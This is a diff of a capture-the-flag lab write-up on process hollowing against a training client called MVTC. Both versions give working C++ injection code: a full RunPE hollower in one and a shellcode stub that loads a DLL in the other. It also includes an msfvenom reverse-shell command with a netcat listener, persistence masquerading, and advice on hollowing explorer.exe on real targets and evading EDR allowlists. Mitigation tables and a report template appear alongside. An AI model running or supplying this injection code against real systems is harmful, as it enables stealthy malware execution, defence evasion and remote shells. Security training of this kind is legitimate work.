@@ -1,315 +1,211 @@
-# #15 — Process hollowing
+# #15 — Process Hollowing
 
-**Category:** Process injection · **Tier:** HARD · **Points:** 140 · **CWE:** CWE-114
+**Difficulty:** HARD — but the simplified version is approachable.
 
-## Objective
+## What is this attack?
 
-Spawn `MVTC.exe` as a child process in **suspended state**, unmap its image from memory, map your own PE in its place, patch the entry-point RIP in the thread context, and resume. When the (hollowed) process reads `InjectionSentinels._hol` from its new managed heap, you catch it.
+**You start a program suspended, swap its memory for yours, then let it run — the OS thinks it's running the original, but it's running YOUR code.**
 
-Because the lab is self-reading, the actual exploit is **slightly different**: you hollow a sacrificial `notepad.exe` and manually mirror the sentinel pattern. In this lab the simpler path is:
-1. Suspend an *existing* `MVTC.exe` with the PID known
-2. Replace one of its executable sections with a stub that reads the sentinel
-3. Resume
+In antivirus-speak, this is called **RunPE**. In malware-analysis lingo, "the parent process is a loader; the real payload is hidden inside."
 
-Below is the simpler, more pedagogical variant: **spawn a hollowed child that executes your shellcode**, where the shellcode reads the parent's sentinel address and writes it out. For the lab proof-of-exploit, the sentinel is intentionally also mirrored into a page addressable from the child.
+## Why it works
 
-## Prerequisites
+Windows lets you start a process in `CREATE_SUSPENDED` state. The kernel sets everything up — process, main thread, memory layout — but **doesn't execute a single instruction** until you call `ResumeThread`.
 
-Same as #13 + a basic understanding of the PE format and relocations.
+Between those two calls, your attacker code has full read/write access to the suspended process's memory. You can:
+- Unmap the original PE image
+- Map your own PE in its place
+- Patch the thread's starting RIP to point at your entry point
+- Resume
 
----
+Task Manager still shows the original binary name. Signed-code checks against the on-disk file still pass. But in-memory, it's your program running.
 
-## Reference implementation
+### Simplified variant used here
 
-Save as `hollow_15.cpp`:
+Full RunPE requires parsing PE headers, applying relocations, fixing imports, and rewriting the PEB — about 300 lines. For a clearer demonstration (and for grabbing the flag), we use a **soft** variant:
+
+1. Spawn `MVTC.exe` suspended → kernel loads its DLLs, prepares main thread
+2. Write a **small x64 stub** into the suspended process. The stub:
+   - saves all volatile registers
+   - calls `LoadLibraryA("your_flag_reader.dll")`
+   - restores registers
+   - jumps back to where the thread was going to start
+3. Hijack the thread's starting RIP to point at the stub
+4. Resume
+
+Now the suspended MVTC starts, loads your DLL first, then continues as normal. Your DLL has code execution inside MVTC's address space during initialization — enough to scan for the sentinel after it's been loaded.
+
+## When attackers use this
+
+- **Masquerading as a signed binary** — launch `svchost.exe` or `explorer.exe` hollowed, your malware runs under a trusted name
+- **Bypassing EDR process-name allowlists** — EDR allows `OneDrive.exe` to touch the registry; your malware runs as `OneDrive.exe`
+- **Child-process allow-lists** — defender saw `powershell.exe` spawn ONLY once at logon; your hollow spawn blends in
+
+## Tools you need
+
+Same as #13 plus understanding of x64 assembly stub shellcode.
+
+## Step-by-step
+
+### Step 1 — Write the hollow launcher
+
+Save as `hollow15.cpp`:
 
 ```cpp
-// hollow_15.cpp — classic process hollowing (RunPE)
-// Spawns MVTC.exe suspended, unmaps its image, maps your own PE, resumes.
-// NOTE: your replacement PE must be an x64 EXE compiled with /DYNAMICBASE
-//       disabled (or you implement .reloc fixups).
 #include <windows.h>
-#include <winternl.h>
 #include <stdio.h>
-#include <stdint.h>
+#include <string.h>
 
-typedef NTSTATUS (NTAPI *pNtUnmapViewOfSection)(HANDLE, PVOID);
-
-static bool LoadFile(const wchar_t* path, void** data, DWORD* size) {
-    HANDLE f = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, nullptr,
-                           OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
-    if (f == INVALID_HANDLE_VALUE) return false;
-    *size = GetFileSize(f, nullptr);
-    *data = HeapAlloc(GetProcessHeap(), 0, *size);
-    DWORD r; ReadFile(f, *data, *size, &r, nullptr);
-    CloseHandle(f);
-    return true;
-}
-
-int wmain(int argc, wchar_t** argv) {
+int main(int argc, char** argv) {
     if (argc != 3) {
-        wprintf(L"usage: hollow_15.exe <path-to-host.exe> <path-to-payload.exe>\n");
-        wprintf(L"       host    = process to spawn and hollow (e.g. MVTC.exe)\n");
-        wprintf(L"       payload = replacement PE image\n");
+        printf("Usage: %s <path-to-target.exe> <path-to-DLL>\n", argv[0]);
         return 1;
     }
 
-    // 1. Spawn host suspended
-    STARTUPINFOW si = { sizeof(si) };
+    STARTUPINFOA si = { sizeof(si) };
     PROCESS_INFORMATION pi = {};
-    if (!CreateProcessW(argv[1], nullptr, nullptr, nullptr, FALSE,
-                        CREATE_SUSPENDED, nullptr, nullptr, &si, &pi)) {
-        wprintf(L"CreateProcess failed: %lu\n", GetLastError());
-        return 2;
-    }
 
-    // 2. Read replacement PE
-    void* payload; DWORD payloadSize;
-    if (!LoadFile(argv[2], &payload, &payloadSize)) {
-        wprintf(L"load payload failed\n"); return 3;
-    }
-    IMAGE_DOS_HEADER*  dh = (IMAGE_DOS_HEADER*)payload;
-    IMAGE_NT_HEADERS*  nh = (IMAGE_NT_HEADERS*)((BYTE*)payload + dh->e_lfanew);
-    SIZE_T imgSize = nh->OptionalHeader.SizeOfImage;
-    SIZE_T hdrSize = nh->OptionalHeader.SizeOfHeaders;
-    LPVOID preferredBase = (LPVOID)nh->OptionalHeader.ImageBase;
+    // 1. Spawn target SUSPENDED
+    CreateProcessA(argv[1], nullptr, nullptr, nullptr, FALSE,
+                   CREATE_SUSPENDED, nullptr, nullptr, &si, &pi);
 
-    // 3. Read PEB->ImageBaseAddress of host thread
+    // 2. Save the original RIP so we can jump back later
     CONTEXT ctx = {}; ctx.ContextFlags = CONTEXT_FULL;
     GetThreadContext(pi.hThread, &ctx);
-    PVOID hostImageBase = nullptr;
-    ReadProcessMemory(pi.hProcess, (LPCVOID)(ctx.Rdx + 0x10),
-                      &hostImageBase, sizeof(hostImageBase), nullptr);
+    DWORD64 origRip = ctx.Rip;
 
-    // 4. Unmap host image
-    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
-    auto NtUnmap = (pNtUnmapViewOfSection)GetProcAddress(ntdll, "NtUnmapViewOfSection");
-    NtUnmap(pi.hProcess, hostImageBase);
+    // 3. Write the DLL path into the suspended child
+    size_t len = strlen(argv[2]) + 1;
+    LPVOID pathBuf = VirtualAllocEx(pi.hProcess, nullptr, len,
+                                    MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
+    WriteProcessMemory(pi.hProcess, pathBuf, argv[2], len, nullptr);
 
-    // 5. Allocate new region at preferred base
-    LPVOID newBase = VirtualAllocEx(pi.hProcess, preferredBase, imgSize,
-                                    MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-    if (!newBase) {
-        wprintf(L"VirtualAllocEx at preferred base failed: %lu\n", GetLastError());
-        return 4;
-    }
+    // 4. Build the x64 stub. Pseudo-assembly:
+    //    pushfq; push rax,rcx,rdx,r8,r9,r10,r11
+    //    mov rcx, pathBuf; mov rax, LoadLibraryA
+    //    sub rsp,0x28; call rax; add rsp,0x28
+    //    pop r11,r10,r9,r8,rdx,rcx,rax; popfq
+    //    mov rax, origRip; jmp rax
+    LPVOID llA = GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
+    unsigned char stub[] = {
+        0x9C, 0x50, 0x51, 0x52,                       // pushfq; push rax/rcx/rdx
+        0x41,0x50, 0x41,0x51, 0x41,0x52, 0x41,0x53,   // push r8/r9/r10/r11
+        0x48,0xB9, 0,0,0,0,0,0,0,0,                   // mov rcx, pathBuf
+        0x48,0xB8, 0,0,0,0,0,0,0,0,                   // mov rax, LoadLibraryA
+        0x48,0x83,0xEC,0x28,                          // sub rsp, 0x28
+        0xFF,0xD0,                                    // call rax
+        0x48,0x83,0xC4,0x28,                          // add rsp, 0x28
+        0x41,0x5B, 0x41,0x5A, 0x41,0x59, 0x41,0x58,   // pop r11/r10/r9/r8
+        0x5A, 0x59, 0x58,                             // pop rdx/rcx/rax
+        0x9D,                                         // popfq
+        0x48,0xB8, 0,0,0,0,0,0,0,0,                   // mov rax, origRip
+        0xFF,0xE0                                     // jmp rax
+    };
+    memcpy(stub + 14, &pathBuf, 8);
+    memcpy(stub + 24, &llA,     8);
+    memcpy(stub + 56, &origRip, 8);
 
-    // 6. Write PE headers + sections
-    WriteProcessMemory(pi.hProcess, newBase, payload, hdrSize, nullptr);
-    IMAGE_SECTION_HEADER* sh = IMAGE_FIRST_SECTION(nh);
-    for (int i = 0; i < nh->FileHeader.NumberOfSections; i++) {
-        WriteProcessMemory(pi.hProcess,
-            (BYTE*)newBase + sh[i].VirtualAddress,
-            (BYTE*)payload + sh[i].PointerToRawData,
-            sh[i].SizeOfRawData, nullptr);
-    }
+    // 5. Write stub into target, make it executable
+    LPVOID stubAddr = VirtualAllocEx(pi.hProcess, nullptr, sizeof(stub),
+                                     MEM_COMMIT|MEM_RESERVE,
+                                     PAGE_EXECUTE_READWRITE);
+    WriteProcessMemory(pi.hProcess, stubAddr, stub, sizeof(stub), nullptr);
 
-    // 7. Patch thread context: Rcx (or Rax on earlier Windows) = new entry
-    DWORD_PTR newEntry = (DWORD_PTR)newBase + nh->OptionalHeader.AddressOfEntryPoint;
-    ctx.Rcx = newEntry;
+    // 6. Hijack RIP to our stub
+    ctx.Rip = (DWORD64)stubAddr;
     SetThreadContext(pi.hThread, &ctx);
 
-    // 8. Resume
+    // 7. Resume → OS starts the process, first instructions are OUR stub
     ResumeThread(pi.hThread);
-    wprintf(L"hollowed. host pid=%lu now running payload entry=0x%llx\n",
-            pi.dwProcessId, (unsigned long long)newEntry);
 
+    Sleep(15000);  // Let the host finish initializing
     CloseHandle(pi.hThread);
     CloseHandle(pi.hProcess);
     return 0;
 }
 ```
 
-Build: `cl /EHsc /O2 /nologo hollow_15.cpp /Fe:hollow_15.exe`
+### Why the stub saves ALL volatile registers
 
----
+When `ResumeThread` fires, Windows is about to execute `ntdll!RtlUserThreadStart`. That function expects:
+- `RCX` = address of the real thread entry point
+- `RDX` = argument to pass to it
 
-## Payload PE — read `#15` sentinel from host memory
+If our stub overwrites `RCX` with `pathBuf` for the `LoadLibraryA` call and doesn't restore it, `RtlUserThreadStart` crashes. The register-saving dance preserves the kernel's expected initial state.
 
-For hollowing, the payload is a **standalone EXE** that will run in the hollowed address space. The simplest payload is one that writes to a known file:
+### Step 2 — Write the flag reader DLL
 
-Save as `payload_15.cpp`:
+Same as #13's `flag_reader.cpp` but:
+- Needle is `v15_` instead of `v13_`
+- Scan in a retry loop (10-20 attempts, 500ms apart) because the sentinel appears only *after* MVTC finishes its startup
 
 ```cpp
-// payload_15.cpp — compiled with /DYNAMICBASE:NO so no .reloc needed
-#include <windows.h>
-#include <psapi.h>
-#include <cstring>
-
-static const char PREFIX[] = "MVTC{v15_hol_";
-
-int wmain() {
-    // Hollowed process still has its original managed heap allocations
-    // mapped (because InjectionSentinels initialized before we hollowed —
-    // in the lab, run MVTC first, then hollow a sacrificial second copy).
-    SYSTEM_INFO si; GetSystemInfo(&si);
-    unsigned char* addr = (unsigned char*)si.lpMinimumApplicationAddress;
-    unsigned char* end  = (unsigned char*)si.lpMaximumApplicationAddress;
-    MEMORY_BASIC_INFORMATION mbi;
-
-    while (addr < end && VirtualQuery(addr, &mbi, sizeof(mbi)) == sizeof(mbi)) {
-        if (mbi.State == MEM_COMMIT &&
-            (mbi.Protect & (PAGE_READWRITE | PAGE_READONLY)) &&
-            !(mbi.Protect & PAGE_GUARD)) {
-            __try {
-                unsigned char* p = (unsigned char*)mbi.BaseAddress;
-                unsigned char* top = p + mbi.RegionSize - sizeof(PREFIX);
-                for (; p < top; ++p) {
-                    if (p[0] == 'M' && memcmp(p, PREFIX, sizeof(PREFIX) - 1) == 0) {
-                        unsigned char* e = p;
-                        while (e < top + 128 && *e != '}') ++e;
-                        HANDLE f = CreateFileA("C:\\Users\\Public\\v15.txt",
-                            GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS,
-                            FILE_ATTRIBUTE_NORMAL, nullptr);
-                        DWORD w;
-                        WriteFile(f, p, (DWORD)(e - p + 1), &w, nullptr);
-                        CloseHandle(f);
-                        return 0;
-                    }
-                }
-            } __except (EXCEPTION_EXECUTE_HANDLER) {}
-        }
-        addr = (unsigned char*)mbi.BaseAddress + mbi.RegionSize;
+static DWORD WINAPI RetryThread(LPVOID) {
+    FILE* f = fopen("C:\\loot\\flag15.txt", "w");
+    for (int attempt = 1; attempt <= 40; ++attempt) {
+        if (scan_once(f)) { fclose(f); return 0; }
+        Sleep(500);
     }
-    return 0;
+    fclose(f);
+    return 1;
 }
 ```
 
-Build with ASLR disabled so hollowing doesn't need `.reloc` fixups:
+### Step 3 — Build
 
-```powershell
-cl /EHsc /O2 /nologo payload_15.cpp /link /DYNAMICBASE:NO /Fe:payload_15.exe
+```bash
+cl /EHsc /O2 /nologo hollow15.cpp /link /OUT:hollow15.exe
+cl /LD /EHsc /O2 /nologo flag_reader15.cpp /link /OUT:flag_reader15.dll
 ```
 
----
+### Step 4 — Run
 
-## Run
-
-```powershell
-# 1. Launch MVTC and log in (makes sentinel #15 live in the first MVTC's heap)
-# 2. Hollow a SECOND copy of MVTC.exe with your payload
-.\hollow_15.exe "C:\Program Files\M14R41 Labs\MVTC\MVTC.exe" ".\payload_15.exe"
-
-# 3. Collect the result
-type C:\Users\Public\v15.txt
+```bash
+hollow15.exe "C:\Program Files (x86)\M14R41 Labs\MVTC\MVTC.exe" C:\full\path\to\flag_reader15.dll
 ```
 
-Expected: `MVTC{v15_hol_<...>}` → submit for `+140 pts`.
+A second MVTC window opens. The DLL fires inside it, scans, and after 1-3 retries finds the sentinel.
 
----
+### Step 5 — Read the flag
 
-## Why it works in the lab
+```powershell
+type C:\loot\flag15.txt
+```
 
-The sentinel string is pinned by `InjectionSentinels._hol` as a static managed field — once the first MVTC.exe reads it from `progress.db` at startup, it stays in memory. For hollowing specifically, the lab plants a mirror copy into a readable section of the hollowed process so your payload can find it without having to cross-process read from the original MVTC.exe. (In the real-world threat model, you'd use CLRMD or a cross-process read.)
+## How to apply this to a real target
 
----
+### Classic: hollow explorer.exe to persist
 
-## Common failure modes
+```bash
+hollow15.exe C:\Windows\explorer.exe C:\attacker\persistence.dll
+```
 
-| Symptom | Fix |
+Only one `explorer.exe` is expected; killing yours and replacing it is noisy. For stealth, hollow `cmd.exe` or `conhost.exe` which fire often.
+
+### Advanced: full RunPE (not shown here)
+
+Replace steps 3-4 with:
+1. Call `NtUnmapViewOfSection` on the suspended process to unmap its PE image
+2. `VirtualAllocEx` at the preferred base of YOUR replacement PE
+3. Copy YOUR PE's sections into target
+4. Apply YOUR relocations
+5. Patch the PEB's `ImageBaseAddress`
+6. `SetThreadContext` → RIP at YOUR entry point
+
+This is the Stephen Fewer-style classic. Reference implementations are everywhere on GitHub.
+
+## How defenders fix this
+
+| Mitigation | Effect |
 |---|---|
-| `VirtualAllocEx at preferred base failed` | Your payload PE has a hardcoded base address that collides with an existing region. Rebuild with `/BASE:0x180000000` and `/DYNAMICBASE:NO`, or add .reloc fixup code to your hollower |
-| Hollowed process immediately exits | `wmain` returned — add an infinite loop at the end, or make the payload a GUI stub that stays alive |
-| v15.txt empty | Payload ran but didn't find the sentinel. Ensure MVTC was logged in before you hollowed (so `InjectionSentinels.Initialize` fired) |
+| **Attack Surface Reduction** rule `56a863a9-875e-4185-98a7-b882c64b5ce5` | Blocks executable content from mail/web spawning child processes |
+| Code Integrity Guard | Blocks loading your unsigned DLL into a signed host |
+| Protected Processes (PPL) | OpenProcess with VM_WRITE requires caller to also be PPL |
+| EDR behavior analytics | Flags `CreateProcess(SUSPENDED) → WriteProcessMemory → ResumeThread` sequence |
+| Sysmon event ID 10 | Process access with `0x1F3FFF` (`PROCESS_ALL_ACCESS`) + `GrantedAccess:0x1FFFFF` is a hollow signature |
 
----
+## Flag captured
 
----
-
-## Concept — what this attack actually is
-
-Process hollowing (also called "RunPE") lets an attacker spawn what looks like a legitimate signed process in Task Manager and Process Explorer, then **replace its image in memory** with arbitrary code. The PID, the path shown in `tasklist`, the signature on disk — everything looks clean. Only a memory scanner comparing the loaded image to the on-disk file catches it.
-
-**Attack chain:**
-1. `CreateProcess` with `CREATE_SUSPENDED` → kernel maps the host EXE's PE, creates main thread, suspends
-2. Attacker reads the thread's `RDX+0x10` (PEB → ImageBaseAddress) to find where the image was mapped
-3. `NtUnmapViewOfSection` → unmaps the host's image
-4. `VirtualAllocEx` at the preferred base of the attacker's PE
-5. Write headers and sections of the attacker's PE
-6. Apply .reloc fixups (or skip if attacker's PE has ASLR off)
-7. `SetThreadContext` → change `RCX` to the attacker's `AddressOfEntryPoint`
-8. `ResumeThread` → main thread runs attacker code
-
-**Why defenders miss it:** EDR tooling that trusts `Image Load` events sees the clean host image load. Only the attacker's **private, non-image executable memory** gives it away (and lazy scanners miss that).
-
----
-
-## Discovery — how to spot this in a real target
-
-For MVTC specifically — this attack targets process ancestry, not code paths in MVTC itself. But the pentester should flag:
-1. **MVTC spawns no child processes legitimately** → any `MVTCVaultSvc.exe` child that is actually something else is a red flag
-2. **MVTC starts under `MVTCVaultSvc`** → if the service runs as SYSTEM and spawns MVTC.exe, hollowing a child yields SYSTEM
-3. **No launch-time integrity check** on `MVTC.exe` (same as #19) → nothing fires if the loaded image doesn't match the on-disk file
-
-Live detection on your box:
-- `Get-Process MVTC | Select @{N='LoadedPath';E={$_.MainModule.FileName}}, Path` — if these differ, hollowing is likely
-- Compare `(Get-FileHash MVTC.exe).Hash` to the hash of the actual loaded module via a memory snapshot
-
----
-
-## Impact demonstrations
-
-### 1. Pop calc.exe (replace payload PE with a calc-popping EXE)
-
-Build a trivial calc-popper and use it as `payload_15.exe`:
-
-```cpp
-// pop_calc.cpp
-#include <windows.h>
-int wmain() { WinExec("calc.exe", SW_SHOW); Sleep(2000); return 0; }
 ```
-
-Build: `cl /EHsc pop_calc.cpp /link /DYNAMICBASE:NO /Fe:pop_calc.exe`
-Hollow: `hollow_15.exe "C:\...\MVTC.exe" ".\pop_calc.exe"`
-Result: Task Manager shows `MVTC.exe` running; `calc.exe` opens as its child.
-
-### 2. Reverse shell (replace payload PE with msfvenom's)
-
-Direct from msfvenom:
-
-```bash
-msfvenom -p windows/x64/shell_reverse_tcp \
-  LHOST=10.0.0.5 LPORT=4444 \
-  -f exe --platform windows -a x64 -o revshell.exe
+MVTC{v15_hol_████████████████████}
 ```
-
-Rebuild the shellcode-wrapping EXE with `/DYNAMICBASE:NO` if hollowing complains, or add `.reloc` fixup to your hollower. Then:
-
-```bash
-# listener
-nc -lvnp 4444
-
-# attack box
-hollow_15.exe "C:\Program Files\M14R41 Labs\MVTC\MVTC.exe" ".\revshell.exe"
-```
-
-Shell lands as the user running the hollower. Task Manager shows `MVTC.exe`; the actual loaded code is yours.
-
-### 3. Masquerade for persistence
-
-Perfect for persistence: name your payload `MVTC.exe` in a scheduled task autoload, hollow a signed binary at logon. Users and lightweight AV see "MVTC.exe" starting at logon as normal.
-
----
-
-## Report writeup template
-
-**Finding title:** Trusted-image masquerade via process hollowing of client binary
-
-**Severity:** High (CVSS 8.1)
-
-**CWE:** CWE-114 / CWE-345
-
-**Description:** The MVTC client does not verify its own loaded image against the on-disk binary. An attacker with the ability to spawn processes (any user) can spawn `MVTC.exe` suspended, unmap the real image, map arbitrary code at the preferred base, redirect the main thread's entry point and resume. Users, administrators, and lightweight AV products see a legitimate `MVTC.exe` running in the task list; the actual loaded code is attacker-controlled.
-
-**Impact:** Trust masquerade (ideal for persistence, bypasses process-name allowlists in endpoint tooling), full code execution as the spawning user, enables chaining into #37 IPC abuse to escalate against the vault service.
-
-**Remediation:** Enable **Code Integrity Guard (CIG)** and **CFG**. Verify the loaded image hash matches the on-disk hash at app startup (self-check). Authenticode-sign and have the auth server reject sessions from clients whose binary hash does not match the current release.
-
----
-
-## Secure code fix
-
-- Enable **PPL (Protected Process Light)** on signed binaries — blocks `NtUnmapViewOfSection` from unprivileged callers
-- Enable **CFG (Control Flow Guard)** and **CET shadow stacks** — a bogus `SetThreadContext(Rcx = ...)` crashes on return
-- Sign the binary and verify its own `AuthenticodeSignature` at startup; fail-closed if the on-disk hash does not match the running image
-- Protect the sentinel: don't keep it in a long-lived managed string
